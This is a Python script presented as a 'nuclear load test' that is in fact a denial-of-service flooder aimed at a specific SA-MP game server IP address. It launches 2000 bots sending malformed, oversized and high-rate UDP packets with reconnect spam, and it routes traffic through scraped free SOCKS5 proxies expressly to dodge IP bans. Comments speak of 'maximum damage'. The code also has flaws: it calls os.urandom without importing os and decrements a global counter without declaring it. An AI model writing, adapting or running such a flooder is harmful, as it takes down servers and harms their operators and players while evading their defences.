import socket
import threading
import time
import random
import struct
import requests
import socks  # PySocks for proxy support
from concurrent.futures import ThreadPoolExecutor

# TARGET SERVER (CHANGE TO YOUR TEST SERVER)
TARGET_IP = "51.254.178.238"  # Replace with target IP
TARGET_PORT = 7777             # SA-MP default port

# NUCLEAR OPTIONS (ADJUST FOR MAX IMPACT)
NUM_BOTS = 2000                # Number of simulated bots
CONNECT_RATE = 100             # New connections per second
PACKET_RATE = 1000             # Packets per bot per second
TEST_DURATION = 600            # 10 minutes of chaos

# PROXY CONFIG (Avoid IP bans)
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
]

# ATTACK MODES (All enabled for maximum damage)
USE_MALFORMED_PACKETS = True   # Send invalid SA-MP packets
USE_OVERSIZE_PACKETS = True    # Send 64KB+ packets
USE_RECONNECT_SPAM = True      # Rapidly reconnect bots
USE_PROXY_ROTATION = True      # Rotate IPs to avoid bans

# GLOBAL STATS
total_packets = 0
active_bots = 0

def fetch_proxies():
    proxies = []
    for url in PROXY_SOURCES:
        try:
            res = requests.get(url, timeout=10)
            proxies.extend(res.text.strip().split('\n'))
        except:
            continue
    return list(set(proxies))  # Remove duplicates

class NuclearBot:
    def __init__(self, bot_id, proxy=None):
        self.bot_id = bot_id
        self.proxy = proxy
        self.sock = None
        self.running = True
        self.packets_sent = 0

    def connect(self):
        try:
            if self.proxy and USE_PROXY_ROTATION:
                proxy_ip, proxy_port = self.proxy.split(':')
                self.sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
                self.sock.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            else:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            self.sock.settimeout(0.1)
            
            # Send fake join packet
            join_packet = b'\x01' + bytes([self.bot_id % 256]) + f"NUKE_{self.bot_id}".encode() + b'\x00'
            self.sock.sendto(join_packet, (TARGET_IP, TARGET_PORT))
            self.packets_sent += 1
            global active_bots
            active_bots += 1
        except:
            pass

    def generate_attack_packet(self):
        # Generate malicious packets
        if USE_MALFORMED_PACKETS and random.random() < 0.4:
            return os.urandom(random.randint(10, 5000))  # Garbage data
        
        if USE_OVERSIZE_PACKETS and random.random() < 0.2:
            return b'\x04' + (b'X' * random.randint(65535, 100000))  # Oversized
        
        # Valid-looking but high-volume packets
        packet_type = random.choice([0x01, 0x0B, 0x0D, 0xFF])
        return bytes([packet_type]) + struct.pack('I', self.bot_id) + os.urandom(128)

    def attack(self):
        self.connect()
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < TEST_DURATION:
            try:
                # Send packet barrage
                for _ in range(random.randint(1, 10)):
                    packet = self.generate_attack_packet()
                    self.sock.sendto(packet, (TARGET_IP, TARGET_PORT))
                    self.packets_sent += 1
                    global total_packets
                    total_packets += 1
                
                # Reconnect spam
                if USE_RECONNECT_SPAM and random.random() < 0.05:
                    self.sock.close()
                    self.connect()
                    
                time.sleep(1 / PACKET_RATE)
            except:
                self.connect()  # Reconnect on failure
        
        self.sock.close()
        active_bots -= 1

def stats_thread():
    start_time = time.time()
    while (time.time() - start_time) < TEST_DURATION:
        time.sleep(5)
        print(f"💥 Bots: {active_bots}/{NUM_BOTS} | Packets: {total_packets:,}")
    print("🔥 Nuclear test completed.")

def main():
    print(f"🚀 LAUNCHING NUCLEAR LOAD TEST ON {TARGET_IP}:{TARGET_PORT}")
    print(f"💣 Bots: {NUM_BOTS} | Packets/sec: ~{NUM_BOTS * PACKET_RATE:,}")
    
    proxies = fetch_proxies() if USE_PROXY_ROTATION else []
    print(f"🔌 Proxies loaded: {len(proxies)}" if proxies else "⚠️ No proxies - using raw IP")
    
    bots = []
    with ThreadPoolExecutor(max_workers=500) as executor:
        for i in range(NUM_BOTS):
            proxy = random.choice(proxies) if proxies else None
            bot = NuclearBot(i, proxy)
            bots.append(bot)
            executor.submit(bot.attack)
            time.sleep(1 / CONNECT_RATE)
    
    threading.Thread(target=stats_thread, daemon=True).start()
    time.sleep(TEST_DURATION)
    
    for bot in bots:
        bot.running = False

if __name__ == "__main__":
    main()